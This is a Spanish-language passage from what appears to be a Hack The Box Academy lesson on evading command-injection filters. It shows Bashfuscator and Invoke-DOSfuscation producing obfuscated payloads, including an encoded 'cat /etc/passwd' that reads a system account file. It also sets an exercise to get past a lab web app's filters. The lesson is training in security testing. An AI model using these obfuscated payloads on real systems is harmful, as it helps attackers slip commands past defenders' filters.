# Evasion Tools

Si estamos tratando con herramientas de seguridad avanzadas, es posible que no podamos usar técnicas básicas de ofuscación manual. En tales casos, puede ser mejor recurrir a herramientas de ofuscación automatizadas. Esta sección discutirá un par de ejemplos de este tipo de herramientas, uno para`Linux`y otro para`Windows.`

---

# **Linux (Bashfuscator)**

Una herramienta útil que podemos utilizar para ofuscar los comandos de bash es[Bashfuscator](https://github.com/Bashfuscator/Bashfuscator). Podemos clonar el repositorio de GitHub y luego instalar sus requisitos, de la siguiente manera:

Herramientas de evasión

```
xnoxos@htb[/htb]$ git clone https://github.com/Bashfuscator/Bashfuscatorxnoxos@htb[/htb]$ cd Bashfuscatorxnoxos@htb[/htb]$ pip3 install setuptools==65xnoxos@htb[/htb]$ python3 setup.py install --user
```

Una vez que tenemos la herramienta configurada, podemos comenzar a usarla desde el`./bashfuscator/bin/`directorio. Hay muchas banderas que podemos usar con la herramienta para ajustar nuestro comando ofuscado final, como podemos ver en el`-h`Menú de ayuda:

Herramientas de evasión

```
xnoxos@htb[/htb]$ cd ./bashfuscator/bin/xnoxos@htb[/htb]$ ./bashfuscator -husage: bashfuscator [-h] [-l] ...SNIP...

optional arguments:
  -h, --help            show this help message and exit

Program Options:
  -l, --list            List all the available obfuscators, compressors, and encoders
  -c COMMAND, --command COMMAND
                        Command to obfuscate
...SNIP...

```

Podemos comenzar simplemente proporcionando el comando que queremos ofuscar con el`-c`bandera:

Herramientas de evasión

```
xnoxos@htb[/htb]$ ./bashfuscator -c 'cat /etc/passwd'[+] Mutators used: Token/ForCode -> Command/Reverse
[+] Payload:
${*/+27\[X\(} ...SNIP...  ${*~}   [+] Payload size: 1664 characters

```

Sin embargo, ejecutar la herramienta de esta manera elegirá una técnica de ofuscación al azar, que puede generar una longitud de comando que varía de unos pocos cientos de caracteres a más de un millón de caracteres. Por lo tanto, podemos usar algunas de las banderas del menú de ayuda para producir un comando ofuscado más corto y simple, de la siguiente manera:

Herramientas de evasión

```
xnoxos@htb[/htb]$ ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1[+] Mutators used: Token/ForCode
[+] Payload:
eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"
[+] Payload size: 104 characters

```

Ahora podemos probar el comando salido con`bash -c ''`, para ver si ejecuta el comando previsto:

Herramientas de evasión

```
xnoxos@htb[/htb]$ bash -c 'eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"'root:x:0:0:root:/root:/bin/bash
...SNIP...

```

Podemos ver que el comando ofuscado funciona, todo mientras parece completamente ofuscado, y no se parece a nuestro comando original. También podemos notar que la herramienta utiliza muchas técnicas de ofuscación, incluidas las que discutimos anteriormente y muchos otros.

Ejercicio: intente probar el comando anterior con nuestra aplicación web, para ver si puede omitir con éxito los filtros. Si no es así, ¿puedes adivinar por qué? ¿Y puede hacer que la herramienta produzca una carga útil que funcione?

---

# **Windows (dosfuscación)**

También hay una herramienta muy similar que podemos usar para Windows llamada[Dosfusco](https://github.com/danielbohannon/Invoke-DOSfuscation). A diferencia de`Bashfuscator`, esta es una herramienta interactiva, ya que la ejecutamos una vez e interactuamos para obtener el comando ofuscado deseado. Una vez más, podemos clonar la herramienta de GitHub y luego invocarla a través de PowerShell, de la siguiente manera:

Herramientas de evasión

```powershell
PS C:\htb> git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
PS C:\htb> cd Invoke-DOSfuscation
PS C:\htb> Import-Module .\Invoke-DOSfuscation.psd1
PS C:\htb> Invoke-DOSfuscation
Invoke-DOSfuscation> help

HELP MENU :: Available options shown below:
[*]  Tutorial of how to use this tool             TUTORIAL
...SNIP...

Choose one of the below options:
[*] BINARY      Obfuscated binary syntax for cmd.exe & powershell.exe
[*] ENCODING    Environment variable encoding
[*] PAYLOAD     Obfuscated payload via DOSfuscation

```

Incluso podemos usar`tutorial`Para ver un ejemplo de cómo funciona la herramienta. Una vez que estamos configurados, podemos comenzar a usar la herramienta, de la siguiente manera:

Herramientas de evasión

```powershell
Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1

...SNIP...
Result:
typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt

```

Finalmente, podemos intentar ejecutar el comando ofuscado en`CMD`, y vemos que de hecho funciona como se esperaba:

Herramientas de evasión

```
C:\htb> typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt

test_flag

```

Consejo: si no tenemos acceso a una VM de Windows, podemos ejecutar el código anterior en una VM Linux a través de`pwsh`. Correr`pwsh`, y luego siga exactamente el mismo comando desde arriba. Esta herramienta se instala de forma predeterminada en su instancia `pwnbox`. También puede encontrar instrucciones de instalación en este[enlace](https://docs.microsoft.com/en-us/powershell/scripting/install/installing-powershell-core-on-linux).

For more on advanced obfuscation methods, you may refer to the [Secure Coding 101: JavaScript](https://academy.hackthebox.com/course/preview/secure-coding-101-javascript) module, which covers advanced obfuscations methods that can be utilized in various attacks, including the ones we covered in this module.